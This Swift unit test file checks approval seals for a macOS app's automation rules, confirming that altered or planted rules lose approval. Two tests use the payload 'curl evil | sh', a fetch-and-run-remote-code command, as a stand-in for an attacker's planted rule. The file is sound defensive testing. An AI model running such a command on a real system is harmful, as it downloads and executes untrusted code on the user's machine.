import XCTest
@testable import FBDCore

/// Approval seals: a rule fires on its event only if the app sealed exactly
/// what it says now.
final class AutomationSealTests: XCTestCase {
    private final class InMemorySecretStore: SecretStore {
        var items: [String: String] = [:]
        var failWrites = false
        func read(account: String) -> String? { items[account] }
        func write(_ value: String, account: String) -> Bool {
            if failWrites { return false }
            items[account] = value
            return true
        }
        func delete(account: String) { items[account] = nil }
    }

    private let key = Data(repeating: 7, count: 32)

    private func rule(payload: String = "say hi", enabled: Bool = true) -> AutomationRule {
        AutomationRule(
            id: UUID(uuidString: "11111111-2222-3333-4444-555555555555")!,
            displayIdentityKey: "",
            event: .systemWake,
            kind: .shellScript,
            payload: payload,
            enabled: enabled
        )
    }

    func testSealVerifiesForTheRuleItWasMadeFor() {
        let rule = rule()
        XCTAssertTrue(AutomationSeal.isValid(AutomationSeal.seal(rule, key: key), for: rule, key: key))
    }

    func testUnsealedRuleIsNotApproved() {
        XCTAssertFalse(AutomationSeal.isValid(nil, for: rule(), key: key))
        XCTAssertFalse(AutomationSeal.isValid("", for: rule(), key: key))
        XCTAssertFalse(AutomationSeal.isValid("not base64 !!", for: rule(), key: key))
    }

    func testWithoutAKeyNothingIsApproved() {
        let rule = rule()
        XCTAssertFalse(AutomationSeal.isValid(AutomationSeal.seal(rule, key: key), for: rule, key: nil))
    }

    func testSealFromAnotherKeyIsRejected() {
        let rule = rule()
        let forged = AutomationSeal.seal(rule, key: Data(repeating: 8, count: 32))
        XCTAssertFalse(AutomationSeal.isValid(forged, for: rule, key: key))
    }

    /// The attack this exists for: an approved rule's seal copied onto a rule
    /// that runs something else.
    func testChangingWhatRunsOrWhenVoidsTheSeal() {
        let approved = rule()
        let seal = AutomationSeal.seal(approved, key: key)

        XCTAssertFalse(AutomationSeal.isValid(seal, for: rule(payload: "curl evil | sh"), key: key))

        var other = approved
        other.event = .displayConnected
        XCTAssertFalse(AutomationSeal.isValid(seal, for: other, key: key))
        other = approved
        other.kind = .url
        XCTAssertFalse(AutomationSeal.isValid(seal, for: other, key: key))
        other = approved
        other.displayIdentityKey = "some-display"
        XCTAssertFalse(AutomationSeal.isValid(seal, for: other, key: key))

        let sameWordsNewID = AutomationRule(displayIdentityKey: "", event: .systemWake, kind: .shellScript, payload: "say hi")
        XCTAssertFalse(AutomationSeal.isValid(seal, for: sameWordsNewID, key: key))
    }

    func testTogglingEnabledKeepsTheApproval() {
        let seal = AutomationSeal.seal(rule(enabled: true), key: key)
        XCTAssertTrue(AutomationSeal.isValid(seal, for: rule(enabled: false), key: key))
    }

    func testFieldBoundariesAreNotAmbiguous() {
        var a = rule(payload: "b")
        a.displayIdentityKey = "a"
        var b = rule(payload: "")
        b.displayIdentityKey = "ab"
        XCTAssertNotEqual(AutomationSeal.message(for: a), AutomationSeal.message(for: b))
    }

    /// What the event path runs: a planted rule sits in the same store as an
    /// approved one and is left out.
    func testOnlySealedRulesAreApprovedForEvents() {
        let approved = rule()
        let planted = AutomationRule(displayIdentityKey: "", event: .systemWake, kind: .shellScript, payload: "curl evil | sh")
        let seals = [
            approved.id.uuidString: AutomationSeal.seal(approved, key: key),
            // A seal the attacker can write, but not make.
            planted.id.uuidString: AutomationSeal.seal(approved, key: key),
        ]
        XCTAssertEqual(AutomationSeal.approved([approved, planted], seals: seals, key: key), [approved])
        XCTAssertEqual(AutomationSeal.approved([approved, planted], seals: [:], key: key), [])
        XCTAssertEqual(AutomationSeal.approved([approved, planted], seals: seals, key: nil), [])
    }

    // MARK: - The key

    func testKeyIsNotCreatedWhenOnlyReading() {
        let store = InMemorySecretStore()
        XCTAssertNil(AutomationSeal.key(store: store, create: false))
        XCTAssertTrue(store.items.isEmpty)
    }

    func testKeyIsCreatedOnceAndReused() throws {
        let store = InMemorySecretStore()
        let created = try XCTUnwrap(AutomationSeal.key(store: store, create: true))
        XCTAssertEqual(created.count, 32)
        XCTAssertEqual(AutomationSeal.key(store: store, create: false), created)
        XCTAssertEqual(AutomationSeal.key(store: store, create: true), created)
    }

    func testNoKeyWhenItCannotBePersisted() {
        let store = InMemorySecretStore()
        store.failWrites = true
        XCTAssertNil(AutomationSeal.key(store: store, create: true))
    }
}
